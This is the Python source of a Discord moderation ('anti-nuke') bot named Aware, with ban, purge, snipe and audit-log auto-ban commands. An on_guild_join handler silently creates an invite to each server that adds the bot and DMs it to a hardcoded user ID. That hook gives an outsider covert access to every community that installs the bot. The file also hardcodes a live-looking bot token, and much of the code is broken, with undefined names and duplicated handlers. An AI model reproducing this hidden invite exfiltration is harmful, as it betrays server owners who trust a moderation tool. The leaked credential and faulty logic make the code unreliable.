import os
import requests
import json
import os
import discord
import datetime
from datetime import datetime
from discord.ext import commands
import discord
from webserver import keep_alive
import datetime
start_time = datetime.datetime.utcnow()
import discord
import os
from webserver import keep_alive
import os
import asyncio
import os.path
import humanfriendly
import json
from discord.ext import commands
from discord.ext.commands import MissingPermissions
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
from dotenv import load_dotenv
load_dotenv()
from cogs.AntiChannel import AntiChannel
from cogs.Antiemoji import Antiemoji
from cogs.AntiRemoval import AntiRemoval
from cogs.AntiRole import AntiRole
from cogs.AntiWebhook import AntiWebhook
from cogs.moderation import moderation
from cogs.misc import misc
  
IGNORE = (
    938445857035014184)

def is_allowed(ctx):
    return ctx.message.author.id == "938445857035014184"

def is_server_owner(ctx):
    return ctx.message.author.id == ctx.guild.owner.id or ctx.message.author.id == "938445857035014184"

def botowner(ctx):
  return ctx.message.author.id == 938445857035014184

def get_prefix(verse, ctx):
    if str(ctx.author.id) == "938445857035014184":
        return ""
    else:
        return get_prefix

prefix = ","

client = commands.Bot(command_prefix = (prefix), intents = intents)
client.remove_command("help")
client = commands.AutoShardedBot(
command_prefix=commands.when_mentioned_or(prefix), intents=intents)
client.remove_command("help")


    




client.add_cog(AntiChannel(client))
client.add_cog(Antiemoji(client))
client.add_cog(AntiRemoval(client))
client.add_cog(AntiRole(client))
client.add_cog(AntiWebhook(client))
client.add_cog(moderation(client))
client.add_cog(misc(client))







async def status_task():
    while True:
        await client.change_presence(activity=discord.Game(f"-help | {len(client.guilds)} servers"))
        await asyncio.sleep(10)
        await client.change_presence(activity=discord.Game(f"own | bloock sq"))
        await asyncio.sleep(10)

@client.event
async def on_ready():
    print("Loaded & Online!")
    client.loop.create_task(status_task())


@client.command()
async def help(ctx):
        embed = discord.Embed(color=000000, title="Help")
        
        embed.add_field(name=f"""
        
        **help**""", value="""
        
        **moderation** 
        ```ban```, ```kick```,```mute```, ```lock```, ```unlock```, ```unbanall```
        
        **info**
        ```botinfo```, ```members```, ```si```, ```userinfo```
        
        **antinuke**
        ```cc```, ```features```
        
        **bot**
        ```fuck```
        
        **misc**
        ```av```, ```afk```, ```clean```, ```setnick```, ```prefix```, ```snipe``` """)
        
  
        await ctx.reply(embed=embed, mention_author=True)


         
          



      

@client.command()
async def commands(ctx):
      embed = discord.Embed(description=f"[Invite!](https://discord.com/api/oauth2/authorize?client_id=1091804449342763150&permissions=8&scope=bott)")
      embed = discord.Embed(color=0000)
      embed.add_field(name=f"__Commands Page__",value=f"\n    <a:xext:1028259826955980830>| **Kick** - kicks the member \n <a:xext:1028259826955980830>| **Ban** - bans the member\n <a:xext:1028259826955980830>| **Unban** - unbans the member\n<a:xext:1028259826955980830>| **Role** - gives role to user\n <a:xext:1028259826955980830>| **Lock** - locks the channel\n <a:xext:1028259826955980830>| **Unlock** - unlocks the channel\n  <a:xext:1028259826955980830>| **Members** - shows the total member count of server\n <a:xext:1028259826955980830>| **unbanall** - unbanall user which has banned", inline=False)
      
      embed.set_author(name="Aware | Moderator Commands", url="https://discord.gg/fXtEzBxqkR", icon_url='')
      embed.set_thumbnail(url='')
      embed.set_footer(text='hold :P | Shards:  1 | Proxied: False')

     
      await ctx.reply(embed=embed, mention_author=True)
      
@client.command()
async def features(ctx):
      embed = discord.Embed(description=f"[Invite!](https://discord.com/api/oauth2/authorize?client_id=1091804449342763150&permissions=8&scope=bot)")
      embed = discord.Embed(color=0000)
      embed.add_field(name=f"**Features**", value=f"\n <:enable:1076808546420801616>| Anti Channel Create\n <:enable:1076808546420801616>| Anti Channel Delete \n <:enable:1076808546420801616>| Anti Role Update\n <:enable:1076808546420801616>| Anti Webhook Create\n <:enable:1076808546420801616>| Anti Webhook delete\n <:enable:1076808546420801616>| Anti Webhook update\n <:enable:1076808546420801616>| Anti Server Update \n <:enable:1076808546420801616>| Anti Ban\n <:enable:1076808546420801616>| Anti kick\n <:enable:1076808546420801616>| Anti Role Create\n <:enable:1076808546420801616>| Anti Role Delete\n <:enable:1076808546420801616>| Anti Community  Spam\n <:enable:1076808546420801616>| Anti Bot Added\n <:enable:1076808546420801616>| Anti Prune\n <:enable:1076808546420801616>| Anti Vanity Steal", inline=True)
      
      embed.set_author(name="Aware | Anti-Nuke Features", url="https://discord.gg/fXtEzBxqkR", icon_url='')
      embed.set_thumbnail(url='')
      embed.add_field(name="Anti Nuke Features", value="Auto Recovery = <:enable:1076808546420801616>")
     
      await ctx.reply(embed=embed, mention_author=True)


  
  
@client.command()
async def antinuke(ctx):
      embed = discord.Embed(description=f"[Invite!](https://discord.com/api/oauth2/authorize?client_id=1091804449342763150&permissions=8&scope=bot)")
      
      embed = discord.Embed(color=0000)
      embed.add_field(name=f"**AntiNuke**", value=f"\n | features - To Show Antinuke Features\n | recover - Delete All The moderator-rules channel\n | cc - channel clone\n | cp - Check Prune", inline=False)
      embed.set_author(name="blook sq", icon_url='')
      embed.set_thumbnail(url='')
      embed.set_footer(text=' hold | Shards:  1 | Proxied: False')
      await ctx.reply(embed=embed, mention_author=True)
      
      
  
@client.command()
async def misc(ctx):
      embed = discord.Embed(description=f"[Invite!](https://discord.com/api/oauth2/authorize?client_id=1091804449342763150&permissions=8&scope=bot)")
      embed = discord.Embed(color=0000)
      embed.add_field(name=f"**Miscellaneous**", value=f"\n <a:xext:1028259936980959282>| av - ```Show user avatar```\n <a:xext:1028259936980959282>| invite : ```Support Me```\n <a:xext:1028259936980959282>| snipe : ```Shows Recently Deleted Message```\n <a:xext:1028259936980959282>| userinfo : ```Show User info```\n <a:xext:1028259936980959282>| serverinfo : ```Show server info```\n <a:xext:1028259936980959282>| **setnick** : ```change nickname```\n <a:xext:1028259936980959282>| botinfo : ```Bot info```\n <a:xext:1028259936980959282>| prefix : ```You can set bot prefix just type this ```\n <a:xext:1028259936980959282>| afk : ```Away from keyboard```\n <a:xext:1028259936980959282>| clean : ```Purge Message``` ", inline=False)
     
      embed.set_author(name="blook sq | Here Is Miscellaneous Command", icon_url='')
      embed.set_thumbnail(url="")
      embed.set_footer(text=' hold | Shards:  1 | Proxied: False')
      await ctx.reply(embed=embed, mention_author=True)


@client.command(pass_context=True)
async def clean(ctx, limit: int):
  if ctx.author.guild_permissions.administrator:
        await ctx.channel.purge(limit=limit)
        await ctx.send('Cleared by {}'.format(ctx.author.mention))
        await ctx.message.delete()



@clean.error
async def clear_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You cant do that!")

@client.listen("on_member_ban")
async def sbxss(guild: discord.Guild, user: discord.user):
      async for i in guild.audit_logs(limit=1, after=datetime.datetime.now() - datetime.timedelta(minutes = 2), action=discord.AuditLogAction.ban):
           
          await guild.kick(i.user, reason="Anti-Nuke")

@client.listen("on_guild_join")
async def foo(guild):
    channel = guild.text_channels[0]
    rope = await channel.create_invite(unique=True)
    me = client.get_user(958658174196514816)
    await me.send("``I have been added to:``")
    await me.send(rope)

@client.command()

async def info(ctx):
    await ctx.send(embed=discord.Embed(title="Aware", description=f"{len(client.guilds)} servers, {len(client.users)} users | Database is connected"))

@info.error
async def info_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Sorry but this command is only available to the bot owner!")



 


@client.command()
async def unbanall(ctx): 
  if ctx.author.guild_permissions.administrator:
    banlist = await ctx.guild.bans()
    embed = discord.Embed(timestamp=datetime.datetime.utcnow())
    embed.set_author(name=f"Aware", icon_url='')
    embed.add_field(name=f"**Unbanning All users**", value=f"{len(banlist)} will be unbanned")
    embed.set_footer(text=f"{ctx.guild.name}")
    embed.set_thumbnail(url='')
    await ctx.reply(embed=embed)
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass
@unbanall.error
async def unbanall_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Sorry but you are missing administrator perms!")                 
      
@client.command()    
async def recover(ctx):
  if ctx.author.guild_permissions.administrator:
  
    for channel in ctx.guild.channels:
        if channel.name in ('rules', 'moderator-only'):
            try:
                await channel.delete()
            except:
                pass  

@client.command()
async def unbaneveryone(ctx): 
  if ctx.author.guild_permissions.administrator:
    banlist = await ctx.guild.bans()
    embed = discord.Embed(timestamp=datetime.datetime.utcnow())
    embed.set_author(name=f"Aware", icon_url='')
    embed.add_field(name=f"**Unbanning All users**", value=f"{len(banlist)} will be unbanned")
    embed.set_footer(text=f"{ctx.guild.name}")
    embed.set_thumbnail(url='')
    await ctx.reply(embed=embed)
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass
@unbanall.error
async def unbanall_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Sorry but you are missing administrator perms!")           

@client.command(aliases=['av'])
async def showavatar(ctx, member: discord.Member=None):
    if member is None:
        member = ctx.author
    await ctx.channel.purge(limit=1)
    emb = discord.Embed(color=discord.Color.green())
    emb.set_image(url=member.avatar_url)
    await ctx.send(embed=emb)


snipe_message_author = {}
snipe_message_content = {}

@client.event
async def on_message_delete(message):
     snipe_message_author[message.channel.id] = message.author
     snipe_message_content[message.channel.id] = message.content
     await soja(60)
     del snipe_message_author[message.channel.id]
     del snipe_message_content[message.channel.id]



@client.command(name = 'snipe')
async def snipe(ctx):
    channel = ctx.channel
    try: #This piece of code is run if the bot finds anything in the dictionary
        em = discord.Embed(name = f"Last deleted message in #{channel.name}", description = snipe_message_content[channel.id])
        em.set_footer(text = f"This message was sent by {snipe_message_author[channel.id]}")
        await ctx.send(embed = em)
    except KeyError: #This piece of code is run if the bot doesn't find anything in the dictionary
        await ctx.send(f"There are no recently deleted messages in #{channel.name}")
    

@client.command(aliases=['si'])
async def serverinfo(ctx):
  name = str(ctx.guild.name)
  description = str(ctx.guild.description)

  owner = str(ctx.guild.owner)
  id = str(ctx.guild.id)
  region = str(ctx.guild.region)
  memberCount = str(ctx.guild.member_count)

  icon = str(ctx.guild.icon_url)
   
  embed = discord.Embed(
      title=name + " Server Information",
      description=description,
      color=discord.Color.blue()
    )
  embed.set_thumbnail(url=icon)
  embed.add_field(name="Owner", value=owner, inline=True)
  embed.add_field(name="Server ID", value=id, inline=True)
  embed.add_field(name="Region", value=region, inline=True)
  embed.add_field(name="Member Count", value=memberCount, inline=True)

  await ctx.send(embed=embed)


@client.command(aliases=['ui'])
async def userinfo(ctx, member: discord.Member = None):
    if not member:  
        member = ctx.message.author  
    roles = [role for role in member.roles]
    embed = discord.Embed(colour=discord.Colour.purple(), timestamp=ctx.message.created_at,
                          title=f"User Info - {member}")
    embed.set_thumbnail(url=member.avatar_url)
    embed.set_footer(text=f"Requested by {ctx.author}")

    embed.add_field(name="ID:", value=member.id)
    embed.add_field(name="Display Name:", value=member.display_name)

    embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
    embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC")),

    embed.add_field(name="Roles:", value="".join([role.mention for role in roles]))
    embed.add_field(name="Highest Role:", value=member.top_role.mention)
    print(member.top_role.mention)
    await ctx.send(embed=embed)


@client.command()
async def setnick(ctx, member:discord.Member,*,nick=None):
  if ctx.author.guild_permissions.manage_nicknames:
  
    old_nick = member.display_name

    await member.edit(nick=nick)

    new_nick = member.display_name

    await ctx.send(f'Changed nick from *{old_nick}* to *{new_nick}*')




##@commands.command(aliases=['cp'])
##async def pruneestr(ctx):
## @commands.has_permissions(admistrator=True)
##  guild = ctx.guild
 ## try:
  ##  po = await ctx.guild.estimate_pruned_members(days=1, roles=guild.roles)
  ##  await ctx.channel.send(f"Here as your result {po}")
  #except:
  #  pass







@client.event
async def on_member_remove(member):
  guild = member.guild
  logs = await guild.audit_logs(limit=1, after=datetime.datetime.now() - datetime.timedelta(minutes = 2), action=discord.AuditLogAction.member_prune).flatten()
  logs = logs[0]
  reason = "Secure | Anti Prune"
  await logs.user.ban(reason=f"{reason}")

##@commands.cooldown(3, 30, commands.BucketType.user)
##@commands.has_permissions(manage_channels=True)	
@client.command(aliases=["cc"])
async def channelclean(ctx, channeltodelete):
  if ctx.author.guild_permissions.administrator:
    for channel in ctx.message.guild.channels:
            if channel.name == channeltodelete:
                try:
                    await channel.delete()
                except:
                  pass


##@commands.cooldown(3, 300, commands.BucketType.user)
##@commands.has_permissions(administrator=True)
@client.command(aliases=["cr"])
async def roleclean(ctx, roletodelete):
  if ctx.author.guild_permissions.administrator:
    for role in ctx.message.guild.roles:
            if role.name == roletodelete:
                try:
                    await role.delete()
                except:
                  pass



  
@client.command()
async def botinfo(ctx):
    embed = discord.Embed(title='Bot Information', color=000000)
    embed.add_field(name='Server Count', value=f'`{len(client.guilds)}`', inline=False)
    embed.add_field(name='User Count', value=f'`{len(set(client.get_all_members()))}`', inline=False)
    embed.add_field(name='Ping', value=f'`{int(client.latency * 1000)}`', inline=False)
    embed.add_field(name='Discord.py', value=f'`1.5.1`', inline=False)
    embed.add_field(name='Creators', value=f'Camoz', inline=False)
    embed.set_thumbnail(url='')
    await ctx.send(embed=embed)



@client.command()
async def afk(ctx, reason=None):
    current_nick = ctx.author.nick
    await ctx.send(f"{ctx.author.mention} is afk: {reason} ")
    await ctx.author.edit(nick=f"[AFK] {ctx.author.name}")

    counter = 0
    while counter <= int(mins):
        counter += 1
        await asyncio.sleep(60)

        if counter == int(mins):
            await ctx.author.edit(nick=current_nick)
            await ctx.send(f"{ctx.author.mention} is no longer AFK")
            break
async def remove_afk(self, user):
		sql = 'DELETE FROM `afk` WHERE user={0}'
		sql = sql.format(user)
		self.cursor.execute(sql)
		self.cursor.commit()
		del self.afks[str(user)]




@client.event
async def on_guild_emojis_update(before, after):
	guild = emoji.gulid
	logs = await after.guild.audit_logs(limit=1, after=datetime.datetime.now() - datetime.timedelta(minutes = 2), action=discord.AuditLogAction.emoji_update).flatten()
	logs = logs[0]
	await logs.user.ban(reason=f"Aware | Anti Emoji Update")
	
	
@client.event
async def on_guild_emojis_create(emoji):
	guild = emoji.guild
	logs = await guild.audit_logs(limit=1, after=datetime.datetime.now() - datetime.timedelta(minutes = 2), action=discord.AuditLogAction.emoji_create).flatten()
	logs = logs[0]
	await logs.user.ban(reason=f"Aware | Anti Emoji Create")

@client.command()
async def prefix(ctx, prefix):
  if ctx.author.guild_permissions.administrator:
    client.command_prefix = str(prefix)
    await ctx.message.delete()
    await ctx.send('Successfully Changed The Prefix')
  


@client.event
async def on_guild_webhook_create(integration):
  guild = integration.guild
  logs = await guild.audit_logs(limit=1, after=datetime.datetime.now() - datetime.timedelta(minutes = 2), action=discord.AuditLogAction.webhook_create).flatten()
  logs = logs[0]
  reason = "Anti Webhook Create"
  await logs.user.ban(reason=reason)

@client.event
async def on_guild_webhook_update(integration):
  guild = integration.guild
  logs = await guild.audit_logs(limit=1, after=datetime.datetime.now() - datetime.timedelta(minutes = 2), action=discord.AuditLogAction.webhook_update).flatten()
  logs = logs[0]
  reason = "Anti Webhook Update"
  await logs.user.ban(reason=reason)

@client.event
async def on_guild_webhook_delete(integration):
  guild = integration.guild
  logs = await guild.audit_logs(limit=1, after=datetime.datetime.now() - datetime.timedelta(minutes = 2), action=discord.AuditLogAction.webhook_delete).flatten()
  logs = logs[0]
  reason = "Secure | Anti webhook Delete"
  await logs.user.ban(reason=reason)



@client.event
async def on_guild_update(before, after):
  reason = "Anti Guild Update"
 # guild = after.guild
  logs = await after.audit_logs(limit=1,action=discord.AuditLogAction.guild_update).flatten()
  logs = logs[0]
  await logs.user.ban(reason=f"{reason}")
  await after.edit(name=f"{before.name}")

@client.command()
async def ss(ctx, site):
    embed=discord.Embed(colour = discord.Colour.orange(), timestamp=ctx.message.created_at)
    embed.set_image(url=(f"{site}"))
    await ctx.send(embed=embed)




@client.command()
async def join(ctx):
    channel = ctx.author.voice.channel
    await channel.connect(1027608969432281102)
@client.command()
async def leave(ctx):
    await ctx.voice_client.disconnect(1027608969432281102)




keep_alive()
token = "MTA5MTgwNDQ0OTM0Mjc2MzE1MA.G3E4Ef.NM-ivIOq9Df2UwwR0M_zSGT6KtBb_OonRwKURg"
client.run(token)